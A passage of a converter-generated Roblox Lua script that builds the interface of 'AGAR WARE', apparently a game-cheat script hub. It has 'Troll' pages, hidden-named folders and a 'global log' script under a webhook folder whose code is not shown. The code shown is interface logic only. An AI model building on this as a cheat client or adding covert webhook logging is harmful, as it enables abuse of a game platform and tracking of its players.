G2L["310"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["310"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["310"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["310"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["310"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.buttonFade.UIGradient
G2L["311"] = Instance.new("UIGradient", G2L["310"]);
G2L["311"]["Rotation"] = 90;
G2L["311"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.text
G2L["312"] = Instance.new("UIStroke", G2L["30f"]);
G2L["312"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall
G2L["313"] = Instance.new("TextButton", G2L["30e"]);
G2L["313"]["TextSize"] = 12;
G2L["313"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["313"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["313"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["313"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["313"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["313"]["Text"] = [[Unselect All]];
G2L["313"]["Name"] = [[unselectall]];
G2L["313"]["Position"] = UDim2.new(0.5, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.buttonFade
G2L["314"] = Instance.new("CanvasGroup", G2L["313"]);
G2L["314"]["Visible"] = false;
G2L["314"]["BorderSizePixel"] = 0;
G2L["314"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["314"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["314"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["314"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["314"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.buttonFade.UIGradient
G2L["315"] = Instance.new("UIGradient", G2L["314"]);
G2L["315"]["Rotation"] = 90;
G2L["315"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.text
G2L["316"] = Instance.new("UIStroke", G2L["313"]);
G2L["316"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers
G2L["317"] = Instance.new("Frame", G2L["30c"]);
G2L["317"]["BorderSizePixel"] = 0;
G2L["317"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["317"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["317"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["317"]["Name"] = [[dropdownUsers]];
G2L["317"]["LayoutOrder"] = 2;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display
G2L["318"] = Instance.new("TextButton", G2L["317"]);
G2L["318"]["TextWrapped"] = true;
G2L["318"]["TextSize"] = 12;
G2L["318"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["318"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["318"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["318"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["318"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["318"]["Text"] = [[Show Display]];
G2L["318"]["Name"] = [[display]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.buttonFade
G2L["319"] = Instance.new("CanvasGroup", G2L["318"]);
G2L["319"]["Visible"] = false;
G2L["319"]["BorderSizePixel"] = 0;
G2L["319"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["319"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["319"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["319"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["319"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.buttonFade.UIGradient
G2L["31a"] = Instance.new("UIGradient", G2L["319"]);
G2L["31a"]["Rotation"] = 90;
G2L["31a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.text
G2L["31b"] = Instance.new("UIStroke", G2L["318"]);
G2L["31b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends
G2L["31c"] = Instance.new("TextButton", G2L["317"]);
G2L["31c"]["TextSize"] = 12;
G2L["31c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31c"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["31c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31c"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["31c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["31c"]["Text"] = [[Show Friends]];
G2L["31c"]["Name"] = [[friends]];
G2L["31c"]["Position"] = UDim2.new(0.5, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.buttonFade
G2L["31d"] = Instance.new("CanvasGroup", G2L["31c"]);
G2L["31d"]["Visible"] = false;
G2L["31d"]["BorderSizePixel"] = 0;
G2L["31d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["31d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31d"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.buttonFade.UIGradient
G2L["31e"] = Instance.new("UIGradient", G2L["31d"]);
G2L["31e"]["Rotation"] = 90;
G2L["31e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.text
G2L["31f"] = Instance.new("UIStroke", G2L["31c"]);
G2L["31f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling
G2L["320"] = Instance.new("ScrollingFrame", G2L["30c"]);
G2L["320"]["Active"] = true;
G2L["320"]["ZIndex"] = 999999999;
G2L["320"]["BorderSizePixel"] = 0;
G2L["320"]["Name"] = [[dropdownScrolling]];
G2L["320"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["320"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["320"]["Size"] = UDim2.new(1, 0, 0.2, 0);
G2L["320"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["320"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["320"]["ScrollBarThickness"] = 0;
G2L["320"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.UIListLayout
G2L["321"] = Instance.new("UIListLayout", G2L["320"]);
G2L["321"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button
G2L["322"] = Instance.new("TextButton", G2L["320"]);
G2L["322"]["TextTransparency"] = 1;
G2L["322"]["TextSize"] = 14;
G2L["322"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["322"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["322"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["322"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["322"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["322"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["322"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.image
G2L["323"] = Instance.new("ImageLabel", G2L["322"]);
G2L["323"]["ZIndex"] = 99;
G2L["323"]["BorderSizePixel"] = 0;
G2L["323"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["323"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["323"]["Size"] = UDim2.new(0, 20, 1, 0);
G2L["323"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["323"]["BackgroundTransparency"] = 1;
G2L["323"]["Name"] = [[image]];
G2L["323"]["Position"] = UDim2.new(1, -20, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text
G2L["324"] = Instance.new("TextLabel", G2L["322"]);
G2L["324"]["ZIndex"] = 10;
G2L["324"]["BorderSizePixel"] = 0;
G2L["324"]["TextSize"] = 14;
G2L["324"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["324"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["324"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["324"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["324"]["BackgroundTransparency"] = 1;
G2L["324"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["324"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["324"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text.UIPadding
G2L["325"] = Instance.new("UIPadding", G2L["324"]);
G2L["325"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text.text
G2L["326"] = Instance.new("UIStroke", G2L["324"]);
G2L["326"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.buttonFade
G2L["327"] = Instance.new("CanvasGroup", G2L["322"]);
G2L["327"]["Visible"] = false;
G2L["327"]["BorderSizePixel"] = 0;
G2L["327"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["327"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["327"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["327"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["327"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.buttonFade.UIGradient
G2L["328"] = Instance.new("UIGradient", G2L["327"]);
G2L["328"]["Rotation"] = 90;
G2L["328"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup
G2L["329"] = Instance.new("CanvasGroup", G2L["1"]);
G2L["329"]["Visible"] = false;
G2L["329"]["ZIndex"] = 1999999999;
G2L["329"]["BorderSizePixel"] = 0;
G2L["329"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["329"]["Size"] = UDim2.new(0, 450, 0, 80);
G2L["329"]["Position"] = UDim2.new(0.75448, 0, 0.67079, 0);
G2L["329"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["329"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel
G2L["32a"] = Instance.new("TextLabel", G2L["329"]);
G2L["32a"]["TextWrapped"] = true;
G2L["32a"]["BorderSizePixel"] = 0;
G2L["32a"]["TextSize"] = 14;
G2L["32a"]["TextScaled"] = true;
G2L["32a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32a"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32a"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["32a"]["BackgroundTransparency"] = 1;
G2L["32a"]["RichText"] = true;
G2L["32a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["32a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32a"]["Text"] = [[AGAR WARE]];


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel.intro
G2L["32b"] = Instance.new("LocalScript", G2L["32a"]);
G2L["32b"]["Name"] = [[intro]];


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel.UIStroke
G2L["32c"] = Instance.new("UIStroke", G2L["32a"]);
G2L["32c"]["Thickness"] = 1.9;
G2L["32c"]["Color"] = Color3.fromRGB(0, 54, 110);
G2L["32c"]["LineJoinMode"] = Enum.LineJoinMode.Miter;


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.UIScale
G2L["32d"] = Instance.new("UIScale", G2L["329"]);
G2L["32d"]["Scale"] = 1.1;


-- StarterGui.T5784YHRGE89ES98T.RandomShitHIDE
G2L["32e"] = Instance.new("Folder", G2L["1"]);
G2L["32e"]["Name"] = [[RandomShitHIDE]];


-- StarterGui.T5784YHRGE89ES98T.RandomShitHIDE.LabelsTags
G2L["32f"] = Instance.new("LocalScript", G2L["32e"]);
G2L["32f"]["Name"] = [[LabelsTags]];


-- StarterGui.T5784YHRGE89ES98T.MOREMasterHIDE
G2L["330"] = Instance.new("Folder", G2L["1"]);
G2L["330"]["Name"] = [[MOREMasterHIDE]];


-- StarterGui.T5784YHRGE89ES98T.MOREMasterHIDE.tcotoolrefresh
G2L["331"] = Instance.new("LocalScript", G2L["330"]);
G2L["331"]["Name"] = [[tcotoolrefresh]];


-- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE
G2L["332"] = Instance.new("Folder", G2L["1"]);
G2L["332"]["Name"] = [[WEBHOOOOOKSSSSSaaHIDE]];


-- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE.global log
G2L["333"] = Instance.new("LocalScript", G2L["332"]);
G2L["333"]["Name"] = [[global log]];


-- StarterGui.T5784YHRGE89ES98T..
G2L["334"] = Instance.new("LocalScript", G2L["1"]);
G2L["334"]["Name"] = [[.]];


-- StarterGui.T5784YHRGE89ES98T.mainScript
local function C_2()
local script = G2L["2"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	local UserInputService = game:GetService("UserInputService")
	
	for _, frame in pairs(screenGui:GetChildren()) do
		if frame.Name == "MainFrame" and frame:FindFirstChild("itsthisone") then
			frame.Position = UDim2.new(0.5, 0, 0.5, 0)
			frame.AnchorPoint = Vector2.new(0.5, 0.5)
			frame.Active = true
	
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local dragging = false
			local dragStart, startPos
	
			local inputBeganConn, inputChangedConn, inputEndedConn
	
			local function setupDragging()
				if inputBeganConn then inputBeganConn:Disconnect() end
				if inputChangedConn then inputChangedConn:Disconnect() end
				if inputEndedConn then inputEndedConn:Disconnect() end
	
				local scale = uiScale and uiScale.Scale or 1
	
				if scale == 1 then
					frame.Draggable = true
				else
					frame.Draggable = false
	
					inputBeganConn = frame.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
							dragging = true
							dragStart = input.Position
							startPos = frame.Position
						end
					end)
	
					inputChangedConn = UserInputService.InputChanged:Connect(function(input)
						if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
							local delta = input.Position - dragStart
							local currentScale = uiScale and uiScale.Scale or 1
							frame.Position = UDim2.new(
								startPos.X.Scale, 
								startPos.X.Offset + delta.X / currentScale, 
								startPos.Y.Scale, 
								startPos.Y.Offset + delta.Y / currentScale
							)
						end
					end)
	
					inputEndedConn = UserInputService.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
							dragging = false
						end
					end)
				end
			end
	
			if uiScale then
				uiScale:GetPropertyChangedSignal("Scale"):Connect(setupDragging)
			end
			setupDragging()
			break
		end
	end
end;
task.spawn(C_2);
-- StarterGui.T5784YHRGE89ES98T.guicolor
local function C_3()
local script = G2L["3"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local gui = getScreenGui()
	if not gui then return end
	local colorFrame = gui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local function updateColors()
		local targetColor = colorFrame.BackgroundColor3
		for _, obj in pairs(gui:GetDescendants()) do
			if obj.Name == "GuiColor" then
				if obj:IsA("Frame") then
					obj.BackgroundColor3 = targetColor
				elseif obj:IsA("UIStroke") then
					obj.Color = targetColor
				end
			end
		end
	end
	
	updateColors()
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(function()
		updateColors()
	end)
end;
task.spawn(C_3);
-- StarterGui.T5784YHRGE89ES98T.startupScript
local function C_4()
local script = G2L["4"];
	-- Wait then show notification
	task.wait(4)
	_G.Notify("Thank you for using my script - agarvvoid", 5, 139308638407157)
	
	-- Owner join detection
	local Players = game:GetService("Players")
	
	Players.PlayerAdded:Connect(function(player)
		if _G.IsOwner(player.UserId) then
			_G.Notify("The owner of this script joined the server!", 5, 117934611310434)
		end
	end)
	
	-- Check if owner is already in server
	for _, player in pairs(Players:GetPlayers()) do
		if _G.IsOwner(player.UserId) then
			_G.Notify("The owner of this script is in the server!", 5, 117934611310434)
		end
	end
end;
task.spawn(C_4);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.topbarScript
local function C_a()
local script = G2L["a"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local RunService = game:GetService("RunService")
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	local MainFrame = screenGui:FindFirstChild("MainFrame")
	local MinimizeButton = script.Parent:FindFirstChild("minimise")
	local TitleText = script.Parent:FindFirstChild("text")
	
	if not MainFrame or not MinimizeButton or not TitleText then return end
	
	local InnerFrame = MainFrame:FindFirstChild("innerframe")
	local TopBar = MainFrame:FindFirstChild("topbar")
	
	local isMinimized = false
	local originalHeight = MainFrame.Size.Y.Offset
	
	local function toggleMinimize()
		isMinimized = not isMinimized
		if isMinimized then
			if InnerFrame then InnerFrame.Visible = false end
			local topBarHeight = TopBar and TopBar.Size.Y.Offset or 25
	
			-- Calculate offset to keep visual position same with center anchor
			local heightDiff = (originalHeight - topBarHeight) / 2
	
			MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, topBarHeight)
			MainFrame.Position = UDim2.new(
				MainFrame.Position.X.Scale, 
				MainFrame.Position.X.Offset, 
				MainFrame.Position.Y.Scale, 
				MainFrame.Position.Y.Offset - heightDiff
			)
			MinimizeButton.Text = "+"
		else
			if InnerFrame then InnerFrame.Visible = true end
	
			local topBarHeight = TopBar and TopBar.Size.Y.Offset or 25
			local heightDiff = (originalHeight - topBarHeight) / 2
	
			MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, originalHeight)
			MainFrame.Position = UDim2.new(
				MainFrame.Position.X.Scale, 
				MainFrame.Position.X.Offset, 
				MainFrame.Position.Y.Scale, 
				MainFrame.Position.Y.Offset + heightDiff
			)
			MinimizeButton.Text = "-"
		end
	end
	
	MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
	
	-- FPS Display
	local smoothedFPS = 60
	local smoothing = 0.05
	local lastTime = tick()
	
	RunService.RenderStepped:Connect(function()
		local now = tick()
		local deltaTime = now - lastTime
		lastTime = now
		local currentFPS = 1 / deltaTime
		smoothedFPS = smoothedFPS + (currentFPS - smoothedFPS) * smoothing
	
		-- Get ping
		local pingInSeconds = LocalPlayer:GetNetworkPing()
		local ping = math.round(pingInSeconds * 1000)
	
		-- Get server player count
		local playerCount = #Players:GetPlayers()
		local maxPlayers = Players.MaxPlayers
	
		-- Format the stats part with color
		local statsText = string.format(
			'<font color="rgb(180,180,180)">fps %.1f | %dms | server: %d/%d</font>',
			smoothedFPS,
			ping,
			playerCount,
			maxPlayers
		)
	
		TitleText.Text = "AGAR WARE | v3.0.0-alpha.4 | " .. statsText
		TitleText.RichText = true
	end)
end;
task.spawn(C_a);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.pagehandler
local function C_15()
local script = G2L["15"];
	-- Find ScreenGui
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	-- Get the target color from Color frame
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	local targetColor = colorFrame.BackgroundColor3
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	-- Get references
	local buttonContainer = script.Parent
	local mainFrame = buttonContainer.Parent.Parent
	local contentArea = mainFrame:FindFirstChild("contentarea")
	if not contentArea then return end
	-- Page names
	local pageNames = {"Home", "Main", "Troll", "Settings", "TCOMain"}
	-- Colors
	local INACTIVE_BG = Color3.fromRGB(10, 10, 10)
	local ACTIVE_BG = Color3.fromRGB(20, 20, 20)
	local INACTIVE_TEXT = Color3.fromRGB(255, 255, 255)
	
	local currentPage = "Home"
	
	-- Function to switch pages
	local function switchPage(pageName)
		currentPage = pageName
		-- Hide all pages and reset all buttons
		for _, name in pageNames do
			local page = contentArea:FindFirstChild(name)
			if page then
				page.Visible = false
			end
			local button = buttonContainer:FindFirstChild(name)
			if button then
				button.BackgroundColor3 = INACTIVE_BG
				local text = button:FindFirstChild("text")
				if text then
					text.TextColor3 = INACTIVE_TEXT
					text.TextTransparency = 0
				end
			end
		end
		-- Show selected page
		local selectedPage = contentArea:FindFirstChild(pageName)
		if selectedPage then
			selectedPage.Visible = true
		end
		-- Highlight selected button
		local selectedButton = buttonContainer:FindFirstChild(pageName)
		if selectedButton then
			selectedButton.BackgroundColor3 = ACTIVE_BG
			local text = selectedButton:FindFirstChild("text")
			if text then
				text.TextColor3 = targetColor
				text.TextTransparency = 0
			end
		end
	end
	
	local function updateActivePageColor()
		local selectedButton = buttonContainer:FindFirstChild(currentPage)
		if selectedButton then
			local text = selectedButton:FindFirstChild("text")
			if text then
				text.TextColor3 = targetColor
			end
		end
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(function()
		updateAllColors()
		updateActivePageColor()
	end)
	
	-- Connect all buttons
	for _, pageName in pageNames do
		local button = buttonContainer:FindFirstChild(pageName)
		if button then
			button.MouseButton1Click:Connect(function()
				switchPage(pageName)
			end)
		end
	end
	-- Set default page
	switchPage("Home")
end;
task.spawn(C_15);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfoScript
local function C_3d()
local script = G2L["3d"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	
	_G.CreateButton({
		frame = "discord",
		groupbox = script,
		tooltip = "Join my discord server, press here to copy the link.",
		callback = function()
			local success = pcall(function()
				setclipboard("https://discord.gg/7fDasxV2Ht")
			end)
	
			if success then
				_G.Notify("Discord link copied to clipboard!", 3)
			else
				_G.Notify("Failed to copy link!", 3)
			end
	
			return success
		end,
		afterMessage = "Copied to clipboard!",
		errorMessage = "Failed to copy!",
		afterMessageWait = 2,
		canClickDuringAfter = false,
	})
end;
task.spawn(C_3d);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.playerinfo
local function C_48()
local script = G2L["48"];
	local player = game.Players.LocalPlayer
	-- Get references to your UI elements
	local display = script.Parent.display
	local username = script.Parent.username
	local joindate = script.Parent.joindate
	local profile = script.Parent.profile
	local title = script.Parent.Parent["======TITLE======"].text
	-- Set display name
	display.Text = player.DisplayName
	-- Set username with @ format
	username.Text = "@" .. player.Name
	-- Get account creation date and calculate age
	local accountAge = player.AccountAge
	local currentDate = os.date("*t")
	local joinDate = os.date("*t", os.time() - (accountAge * 86400))
	-- Format: ðŸ—“ï¸ YYYY-MM-DD (X days)
	local formattedDate = string.format("ðŸ—“ï¸ %04d-%02d-%02d (%d days)", 
		joinDate.year, 
		joinDate.month, 
		joinDate.day, 
		accountAge
	)
	joindate.Text = formattedDate
	-- Set profile picture
	local userId = player.UserId
	local thumbType = Enum.ThumbnailType.HeadShot
	local thumbSize = Enum.ThumbnailSize.Size420x420
	local content = game:GetService("Players"):GetUserThumbnailAsync(userId, thumbType, thumbSize)
	profile.Image = content
	profile.Visible = true
	-- Set title with display name
	title.Text = "Welcome, " .. player.DisplayName
end;
task.spawn(C_48);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.Script
local function C_6e()
local script = G2L["6e"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	
	
	-- ====================================================================================================
	-- TEXT SCALING
	-- ====================================================================================================
	-- Store original text sizes
	local originalSizes = {}
	
	_G.CreateSlider({
		frame = "textsize",
		groupbox = script,
		tooltip = "Adjust the text size. Default = 5",
		minvalue = 0,
		maxvalue = 10,
		default = 5,
		decimalplaces = 0,
		snap = true,
		callback = function(value)
			local screenGui = script.Parent
			while screenGui and not screenGui:IsA("ScreenGui") do
				screenGui = screenGui.Parent
			end
	
			if screenGui then
				for _, obj in pairs(screenGui:GetDescendants()) do
					if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
						-- Store original size on first run
						if not originalSizes[obj] then
							originalSizes[obj] = obj.TextSize
						end
	
						-- Calculate offset (5 = no change)
						local offset = value - 5
						obj.TextSize = originalSizes[obj] + offset
					end
				end
			end
		end
	})
	
	
	
	
	-- ====================================================================================================
	-- GUI SCALING
	-- ====================================================================================================
	_G.CreateTextbox({
		frame = "guisize",
		textboxname = "guisize",
		tooltip = "Scales the GUI size. Min = 0.70, Max = 2.50.",
		textboxcolor = "frameColor",
		hovercolor = true,
		callback = function(text)
			local value = tonumber(text)
	
			if not value then return end
	
			-- Clamp between 0.70 and 2.50
			value = math.clamp(value, 0.70, 2.50)
	
			-- Round to 2 decimals
			value = math.floor(value * 100 + 0.5) / 100
	
			-- Update textbox to show formatted value
			local p = script.Parent
			while p do
				if p:IsA("ScreenGui") then
					-- Find the textbox and update its display
					local frame = script.Parent:FindFirstChild("guisize")
					if frame then
						local textboxFrame = frame:FindFirstChild("guisize")
						if textboxFrame then
							local textbox = textboxFrame:FindFirstChild("textbox")
							if textbox then
								textbox.Text = string.format("%.2f", value)
							end
						end
					end
	
					-- Apply scale
					local uiScale = p:FindFirstChildOfClass("UIScale")
					if not uiScale then
						uiScale = Instance.new("UIScale")
						uiScale.Parent = p
					end
					uiScale.Scale = value
